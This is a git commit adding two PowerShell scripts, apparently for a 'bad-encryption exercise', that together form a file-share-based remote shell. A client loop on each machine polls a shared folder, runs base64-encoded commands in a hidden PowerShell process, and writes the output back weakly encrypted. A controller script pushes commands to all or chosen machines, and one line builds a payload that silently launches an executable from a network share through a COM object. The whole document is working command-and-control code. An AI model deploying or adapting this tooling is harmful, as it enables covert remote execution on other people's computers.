90f368e621cbe0e6b6987feef393afeacf47f62f
potatoes-and-molasses <eedoshapira@gmail.com>
2017-12-03 12:42:04 +0200

    shell over files for bad-encryption exercise

---
+++ failshell/failshell.ps1
@@ -0,0 +1,103 @@
+﻿$outputspath = '\\folder\ffa\ni\'
+$pool = $outputspath+'j'
+$command = $outputspath+'woops'
+
+
+function dostuff(){
+$tars = gc $pool
+$name = $env:COMPUTERNAME.ToLower()
+if($tars -notcontains $name){
+$name >> $pool
+}
+
+$x = Import-Clixml $command
+$t = $x.t
+if(($name -in $t) -or '@ll_0f_1t' -in $t){
+    
+$c = [text.encoding]::Unicode.GetString([convert]::FromBase64String($x.c))
+$errors = $error.Count
+$out = ((iex $c) -join "`n") + "`n"
+$errors = $error.count - $errors 
+if($errors -gt 0){
+(0..($errors-1)) | %{$out += ($error[$_] -join "`n")+"`n"}
+}
+$md5 = New-Object -typename System.Security.Cryptography.md5CryptoServiceProvider
+$enc = new-object -typename System.Text.UnicodeEncoding
+$iv = $md5.ComputeHash($enc.GetBytes($name)) #lol!!!
+$key = $md5.ComputeHash($enc.getbytes($c))*2 #even more lol!
+
+
+$aes = New-Object system.security.cryptography.aesmanaged 
+$aes.IV = $iv
+$aes.Key = $key
+$outbytes = $enc.GetBytes($out)
+$z = $aes.CreateEncryptor()
+
+$encrypted = [convert]::ToBase64String($z.TransformFinalBlock($outbytes,0,$outbytes.Count))
+$outfile = $outputspath+[convert]::ToBase64String($key).Substring(0,3)+[convert]::ToBase64String($iv)
+[io.file]::WriteAllText($outfile,$encrypted)
+}
+}
+#control functions, move to another file
+function all(){
+gc $pool
+}
+
+function sendcmd([string]$cmd,[array]$tars,[int]$timeout=15000){
+$a = New-Object psobject -Property @{'t'=$tars;'c'=[convert]::ToBase64String([text.encoding]::Unicode.getbytes($cmd));'m'=$timeout}
+$a | Export-Clixml $command
+}
+
+function decryptoutput([string]$cmd,[string]$tar){
+$tar = $tar.ToLower()
+$md5 = New-Object -typename System.Security.Cryptography.md5CryptoServiceProvider
+$enc = new-object -typename System.Text.UnicodeEncoding
+$iv = $md5.ComputeHash($enc.GetBytes($tar)) #lol!!!
+$key = $md5.ComputeHash($enc.getbytes($cmd))*2 #even more lol!
+
+$aes = New-Object system.security.cryptography.aesmanaged 
+$aes.IV = $iv
+$aes.Key = $key
+$outfile = [convert]::ToBase64String($key).Substring(0,3)+[convert]::ToBase64String($iv)
+$outfile = $outputspath+[bitconverter]::tostring($md5.ComputeHash($enc.GetBytes($outfile)))
+$f = [convert]::FromBase64String([io.file]::ReadAllText($outfile))
+$z = $aes.CreateDecryptor()
+[text.encoding]::Unicode.GetString($z.TransformFinalBlock($f,0,$f.Count))
+
+}
+
+function massoutput([string]$cmd,[array]$tars){
+if($tars -eq '@ll_0f_1t'){$tars = all}
+$tars | %{try{"$_>>>";decryptoutput $cmd $_}catch{'no output?'}}
+}
+
+function e($zz){
+$d = $zz.m 
+$u = New-Object System.Diagnostics.ProcessStartInfo
+$u.FileName = 'powershell.exe'
+$u.RedirectStandardError = 1
+$u.RedirectStandardOutput = 1
+$u.UseShellExecute = 0
+$u.Arguments = '-enc '+$zz.c
+$u.WindowStyle = 'hidden'
+$u.CreateNoWindow = 1
+$p = New-Object System.Diagnostics.Process
+$p.StartInfo = $u
+$p.start() | Out-Null
+$p.WaitForExit($d) | Out-Null
+if($p.HasExited){
+$s1 = $p.StandardOutput.ReadToEnd()
+$s2 = $p.StandardError.ReadToEnd()
+$s1+"`n"+$s2+"`n"+$p.ExitCode
+}
+else{
+'timeout'
+}
+$p.Dispose()
+}
+
+#$a=([system.activator]::createinstance([type]::gettypefromclsid("9ba05972-f6a8-11cf-a442-00a0c90a8f39"))).item().document.application;while(1){$a.WindowSwitcher()}
+
+
+$z = "([system.activator]::createinstance([type]::gettypefromclsid('9ba05972-f6a8-11cf-a442-00a0c90a8f39'))).item().document.application.shellexecute('\\folder\lol.exe','','C:\Windows\system32',$null,0)"
+$b = [convert]::ToBase64String([text.encoding]::utf8.getbytes($z))
---
+++ failshell/failshell_clientversion.ps1
@@ -0,0 +1,66 @@
+﻿if(1){
+$y = '\\folder\place\'
+$p = $y+'j'
+$r = $y+'woops'
+$hihi = (gp $r).lastwritetime
+function e($zz){
+$d = $zz.m 
+$u = New-Object System.Diagnostics.ProcessStartInfo
+$u.FileName = 'powershell.exe'
+$u.RedirectStandardError = 1
+$u.RedirectStandardOutput = 1
+$u.UseShellExecute = 0
+$u.WindowStyle = 'hidden'
+$u.CreateNoWindow = 1
+$u.Arguments = '-enc '+$zz.c
+$p = New-Object System.Diagnostics.Process
+$p.StartInfo = $u
+$p.start() | Out-Null
+$p.WaitForExit($d) | Out-Null
+if($p.HasExited){
+$s1 = $p.StandardOutput.ReadToEnd()
+$s2 = $p.StandardError.ReadToEnd()
+$s1+"`n"+$s2+"`n"+$p.ExitCode
+}
+else{
+'timeout'
+}
+$p.Dispose()
+}
+
+function d(){
+$q = gc $p
+$l = $env:COMPUTERNAME.tolower()
+if($q -notcontains $l){
+$l >> $p
+}
+
+$x = Import-Clixml $r
+$t = $x.t
+if(($l -in $t) -or "@ll_0f_1t" -in $t){
+    
+$c = [text.encoding]::Unicode.getstring([convert]::frombase64string($x.c))
+$h = e $x
+
+$u = new-object -typename System.Security.Cryptography.md5CryptoServiceProvider
+$f = new-object -typename System.Text.UnicodeEncoding
+$i = $u.computehash($f.getbytes($l)) #lol!!!
+$b = $u.computehash($f.getbytes($c))*2 #even more lol!
+
+
+$g = New-Object system.security.cryptography.aesmanaged 
+$g.iv = $i
+$g.key = $b
+$q = $f.getbytes($h)
+$z = $g.createencryptor()
+
+$v = [convert]::tobase64string($z.transformfinalblock($q,0,$q.count))
+$k = [convert]::tobase64string($b).substring(0,3)+[convert]::tobase64string($i)
+
+$k = $y+[bitconverter]::tostring($u.computehash($f.getbytes($k)))
+
+[io.file]::writealltext($k,$v)
+}}while(1){if($hihi -ne (gp $r).lastwritetime){$hihi = (gp $r).lastwritetime;d}sleep 3}}
+
+
+
